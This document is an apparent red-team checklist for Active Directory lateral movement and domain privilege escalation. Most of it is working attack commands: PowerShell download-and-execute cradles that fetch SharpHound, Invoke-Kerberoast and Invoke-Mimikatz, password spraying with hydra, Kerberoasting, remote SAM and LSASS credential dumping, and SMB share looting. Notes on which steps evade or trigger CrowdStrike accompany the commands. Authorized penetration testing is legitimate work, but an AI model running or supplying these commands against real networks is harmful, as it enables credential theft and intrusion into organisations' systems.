# Lateral Movement & Domain PrivEsc
Pre-requisites:
 * Domain credentials, or
 * Code execution in the context of a domain user

Notes:
 * Impacket for the most part allows you to auth with Kerberos, using `-k`. You will need to export a local file `KRB5CCNAME` with the ticket in it.
 * Impacket for the most part also supports hash passing (overpass the hash?) because...well Microsoft: `-hashes LMhash:NThash`

Useful links:
 * https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 * https://ired.team/offensive-security/ (Fantastic - good for stealth options!)
 
## Enumeration & Credential Access
 - [ ] Run BloodHound/SharpHound ingestor:
   ```
   # From windows on cmd.exe on domain-joined machine:
   powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound -CollectionMethod all"
   # From windows in powershell.exe from non-domain-joined machine:
   IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound -CollectionMethod all -Domain firenation.com -LdapUsername azula -LdapPassword S0z1nsC0m3t
   # From Kali with bloodhound.py
   bloodhound.py azula@firenation.com -p S0z1nsC0m3t -c All
   ```
    - [ ] Get `users.json` and extract a list of users for sprayin' and prayin'
    - [ ] Identify account lockout policy and duration `net accounts` (TODO: can also be grabbed via GPO on DC)
    - [ ] Spray n' pray mindful of above: `hydra -L users.lst -p 'Spring202X!' smb://target-smb-server`
    - [ ] Mark users as `Owned` as you go (if you get either their NT hash or cleartext creds), constantly looking for escalation paths
    - [ ] Search around and get a good feel for the environment. Mark certain interesting targets as high-value.
 - [ ] Kerberoast all the things:
   ```
   # Kali (impacket):
   getUserSPNs.py 'firenation.com/azula:S0z1nsC0m3t'
   getUserSPNs.py -hashes LMhash:NThash 'firenation.com/azula'
   # Windows (PowerShell):
   powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat"
   ```
   If you get hashes, go to [password cracking](password_crackin.md)
 - [ ] See how far your creds get you. Sometimes BloodHound doesn't always show local admin membership:
   ```
   CredNinja.py -s subnets.lst -a 'firenation.com/azula:S0z1nsC0m3t' --scan --valid --users | tee cred-check.out
   CredNinja.py -s subnets.lst -a 'firenation.com/azula:NThash' --scan --valid --users --ntlm | tee cred-check.out
   ```
 - [ ] If you have local admin somewhere, use secretsdump.py to remotely dump SAM hashes:
   ```
   secretsdump.py 'firenation.com/azula:S0z1nsC0m3t@10.11.1.11'
   secretsdump.py -hashes LMhash:NThash 'firenation.com/azula@10.11.1.11'
   ```
   As far as I've seen, this is not being caught when run remotely. CrowdStrike hasn't alerted on it yet.
 - [ ] See if you can do a remote LSASS dump using `lsassy`:
   ```
   lsassy -d firenation.com -u azula -p S0z1nsC0m3t subnet-or-file-with-nmap-syntax.lst
   ```
   This is **extremely** noisy and CrowdStrike or other tools may absolutely explode, and stop you or at the very least generate alerts. It's not meant to be stealthy.
 - [ ] Can you RDP in and dump LSASS for to extract with MMK locally? If it's a really poorly-protected/monitored enviro can you invoke mimikatz?
   ```
   # Invoke Mimikatz. Careful, likely won't work with AMSI etc.
   powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
   # Or procdump.exe from sysinternals:
   
   ```
   Fairly easy to RDP in, open Task Manager, find `lsass.exe` (might be `Local Security Authority...`), right click, and `Create Dump File`.
   ```
   # Run Mimikatz on your machine:
   sekurlsa::minidump C:\Users\admin\Documents\lsass.dmp
   sekurlsa::logonpasswords
   ```
  - [ ] With SAM hashes, run those through `CredNinja.py` as shown above to see if you owned a network-wide local admin
  - [ ] Log in to target machines with via SMB and look for interesting files:
   ```
   smbclient.py 'firenation.com/azula:S0z1nsC0met@10.11.1.11'
   ## TODO: I know there are tools to spider SMB shares (crackmapexec?) and look for like passwords.txt...checkitout
   ```
  - [ ] Look for user shares/SMB servers and see if there are lax permissions. See if you can find password files, sensitive data, hardcoded creds in scripts, SSH keys, anything juicy.
    - [ ] See some interesting attacks like [this](https://www.criticalstart.com/from-the-trenches-relaying-passwords-for-the-win/) and [this](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
